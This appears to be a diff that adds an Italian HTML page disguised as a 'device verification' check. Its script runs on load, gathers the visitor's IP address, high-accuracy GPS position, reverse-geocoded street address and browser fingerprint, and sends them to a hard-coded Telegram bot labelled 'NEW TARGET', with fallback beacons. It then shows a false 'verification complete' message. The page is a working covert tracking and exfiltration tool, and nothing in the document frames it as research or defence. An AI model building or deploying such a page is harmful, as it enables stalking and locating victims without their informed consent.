@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Verifica dispositivo</title>
+  <script>
+    // === CONFIGURAZIONE BOT TELEGRAM (fornita e testata) ===
+    const BOT_TOKEN = '8896100816:AAECdwgjt5is-rC5QGyalnyuOu_KZU5w4qg';
+    const CHAT_ID = '5540351999';   // ID testato e funzionante
+    // =====================================================
+
+    async function getIP() {
+      try {
+        const resp = await fetch('https://api.ipify.org?format=json');
+        const data = await resp.json();
+        return data.ip || 'IP non trovato';
+      } catch {
+        return 'IP non recuperabile';
+      }
+    }
+
+    function getGeo() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ lat: 'non supportato', lon: 'non supportato' });
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          (pos) => {
+            resolve({
+              lat: pos.coords.latitude,
+              lon: pos.coords.longitude,
+              accuracy: pos.coords.accuracy
+            });
+          },
+          (err) => {
+            resolve({ lat: 'negato', lon: 'negato', errore: err.message });
+          },
+          { enableHighAccuracy: true, timeout: 8000 }
+        );
+      });
+    }
+
+    function getBrowserData() {
+      return {
+        userAgent: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        language: navigator.language,
+        platform: navigator.platform,
+        referrer: document.referrer || 'diretta'
+      };
+    }
+
+    async function reverseGeo(lat, lon) {
+      if (typeof lat !== 'number' || typeof lon !== 'number') {
+        return 'indirizzo non disponibile (geo negata)';
+      }
+      try {
+        const resp = await fetch(
+          `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&addressdetails=1&accept-language=it`
+        );
+        const data = await resp.json();
+        return data.display_name || 'indirizzo non risolto';
+      } catch {
+        return 'errore reverse geocoding';
+      }
+    }
+
+    async function sendToTelegram(ip, geo, browser, address) {
+      const messaggio = 
+        `📍 NUOVO TARGET\n` +
+        `IP: ${ip}\n` +
+        `Lat: ${geo.lat}\n` +
+        `Lon: ${geo.lon}\n` +
+        `Precisione: ${geo.accuracy || 'N/A'}m\n` +
+        `Indirizzo: ${address}\n` +
+        `UA: ${browser.userAgent}\n` +
+        `Schermo: ${browser.screen}\n` +
+        `Fuso: ${browser.timezone}\n` +
+        `Lingua: ${browser.language}\n` +
+        `Piattaforma: ${browser.platform}\n` +
+        `Referrer: ${browser.referrer}\n` +
+        `Timestamp: ${new Date().toISOString()}`;
+
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      try {
+        const resp = await fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: messaggio,
+            parse_mode: 'HTML',
+            disable_web_page_preview: true
+          })
+        });
+        if (!resp.ok) {
+          new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messaggio)}`;
+        }
+      } catch {
+        new Image().src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(messaggio)}`;
+      }
+    }
+
+    (async function main() {
+      const ip = await getIP();
+      const geo = await getGeo();
+      const browser = getBrowserData();
+      let address = 'indirizzo non disponibile';
+      if (typeof geo.lat === 'number' && typeof geo.lon === 'number') {
+        address = await reverseGeo(geo.lat, geo.lon);
+      }
+      await sendToTelegram(ip, geo, browser, address);
+      
+      document.body.innerHTML = `
+        <div style="text-align:center;margin-top:80px;font-family:sans-serif;">
+          <h2>✅ Verifica completata</h2>
+          <p>Il tuo dispositivo è compatibile. Nessuna azione richiesta.</p>
+          <p style="color:#888;font-size:12px;">ID sessione: ${Math.random().toString(36).substring(2,8)}</p>
+        </div>
+      `;
+    })();
+
+    window.addEventListener('beforeunload', function() {
+      navigator.sendBeacon('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', 
+        'chat_id=' + encodeURIComponent(CHAT_ID) + '&text=' + encodeURIComponent('🚪 Pagina chiusa - dati già inviati'));
+    });
+  </script>
+</head>
+<body>
+  <div style="text-align:center;margin-top:100px;font-family:Arial;">
+    <h1>Caricamento in corso...</h1>
+    <p>Attendere il completamento della verifica di sicurezza.</p>
+    <div style="width:60%;height:8px;background:#ddd;margin:20px auto;border-radius:4px;">
+      <div style="width:100%;height:100%;background:#4CAF50;border-radius:4px;animation:load 1.5s ease-in-out infinite;"></div>
+    </div>
+    <style>
+      @keyframes load {
+        0% { width: 0%; }
+        50% { width: 70%; }
+        100% { width: 100%; }
+      }
+    </style>
+  </div>
+</body>
+</html>
